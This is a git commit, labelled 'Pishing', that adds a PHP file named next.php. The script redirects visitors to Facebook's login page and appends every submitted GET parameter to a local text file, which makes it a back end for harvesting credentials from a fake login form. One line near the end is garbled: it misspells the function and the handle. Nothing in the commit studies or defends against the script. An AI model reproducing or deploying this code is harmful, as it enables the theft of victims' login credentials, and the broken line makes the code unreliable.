07f4176b80967b5e4dd812b62e23364e9acddd32
Jonathan David Tronconi <tronconi.j@gmail.com>
2019-09-18 04:31:18 -0300

    Pishing

---
+++ next.php
@@ -0,0 +1,23 @@
+<?php
+header("Location: http://www.Facebook.com/login.php ");
+$handle = 
+
+fopen("yaeresmio.txt", "a"); 
+foreach($_GET as 
+
+$variable => $value) {
+fwrite($handle, 
+
+$variable);
+fwrite($handle, "=");
+
+fwrite($handle, $value);
+fwrite($handle, 
+
+"\r\n");
+}
+
+frité($ande, "\r\n");
+fclose($handle);
+exit
+?>
